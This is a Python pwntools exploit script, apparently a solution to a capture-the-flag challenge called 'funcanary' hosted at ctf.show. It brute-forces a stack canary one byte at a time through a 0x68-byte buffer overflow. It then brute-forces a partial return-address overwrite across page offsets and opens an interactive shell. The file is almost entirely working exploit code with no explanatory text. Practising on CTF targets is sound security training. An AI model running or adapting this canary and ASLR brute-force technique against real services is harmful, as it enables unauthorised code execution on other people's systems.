from pwn import *
import sys
remote_addr = ["pwn.challenge.ctf.show", 28111]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./funcanary")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)



ru(b'welcome')
canary = '\x00'
for k in range(7):
    for i in range(256):
        print("the" + str(k) + ":" + chr(i))
        payload = 'a' * 0x68 + canary + chr(i)
        s(payload)
        a = ru(b'welcome\n')
        if b"fun" in a:
            canary += chr(i)
            print("canary: " + hex(u64(canary.ljust(8, '\x00'))))
            break
        
low = 0x231
for i in range(16):
    payload = b'a' * 0x68 + p64(u64(canary)) + b'a' * 8 + p16(low) 
    s(payload)
    low += 0x1000

shell()
